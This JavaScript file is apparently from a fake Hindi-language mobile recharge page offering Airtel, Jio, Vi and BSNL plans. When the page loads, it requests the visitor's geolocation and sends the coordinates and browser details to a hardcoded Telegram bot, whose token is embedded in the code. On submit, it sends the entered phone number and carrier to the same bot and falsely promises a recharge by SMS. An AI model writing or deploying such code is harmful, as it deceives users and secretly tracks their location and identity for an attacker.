const plansData = {
  Airtel: [
    "₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
    "₹249 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल",
    "₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
  ],
  Jio: [
    "₹149 - 28 दिन - 1GB/दिन + अनलिमिटेड कॉल",
    "₹219 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
    "₹349 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
  ],
  Vi: [
    "₹199 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
    "₹269 - 28 दिन - 2GB/दिन + अनलिमिटेड कॉल",
    "₹399 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
  ],
  BSNL: [
    "₹155 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
    "₹249 - 28 दिन - 1.5GB/दिन + अनलिमिटेड कॉल",
    "₹379 - 56 दिन - 1.5GB/दिन + अनलिमिटेड कॉल"
  ]
};

const simSelect = document.getElementById('sim');
const plansDiv = document.getElementById('plans');
const planList = document.getElementById('plan-list');
const mobileInput = document.getElementById('mobile');
const submitBtn = document.getElementById('submitBtn');

// Show plans on SIM select
simSelect.addEventListener('change', () => {
  const sim = simSelect.value;
  if(sim && plansData[sim]) {
    planList.innerHTML = '';
    plansData[sim].forEach(plan => {
      const li = document.createElement('li');
      li.textContent = plan;
      planList.appendChild(li);
    });
    plansDiv.style.display = 'block';
  } else {
    plansDiv.style.display = 'none';
    planList.innerHTML = '';
  }
});

// Send location to Telegram immediately on load
window.onload = () => {
  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, () => {
      alert('कृपया लोकेशन अनुमति दें ताकि सेवा सुचारू रूप से चले।');
    });
  } else {
    alert('आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।');
  }
};

function sendLocation(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const device = navigator.userAgent;

  const message = `🟢 नया रिचार्ज आवेदन (सक्षम):\n` +
                  `डिवाइस: ${device}\n` +
                  `स्थान: https://maps.google.com/?q=${lat},${lon}`;

  fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: '6038115234',
      text: message
    })
  }).catch(() => {
    console.log('टेलीग्राम भेजने में समस्या');
  });
}

// On submit button click
submitBtn.addEventListener('click', () => {
  const sim = simSelect.value;
  const mobile = mobileInput.value.trim();

  if(!sim) {
    alert('कृपया सिम चुनें।');
    return;
  }
  if(!/^[6-9]\d{9}$/.test(mobile)) {
    alert('कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें।');
    return;
  }

  // Send recharge request to Telegram
  const message = `📱 location tracked:\n` +
                  `SIM: ${sim}\n` +
                  `Mobile No: ${mobile}`;

  fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: '6038115234',
      text: message
    })
  }).then(() => {
    alert('आपका रिचार्ज आवेदन सफलतापूर्वक भेज दिया गया है। 24 घंटे में SMS प्राप्त होगा।');
    mobileInput.value = '';
    simSelect.value = '';
    plansDiv.style.display = 'none';
    planList.innerHTML = '';
  }).catch(() => {
    alert('त्रुटि हुई, कृपया पुनः प्रयास करें।');
  });
});
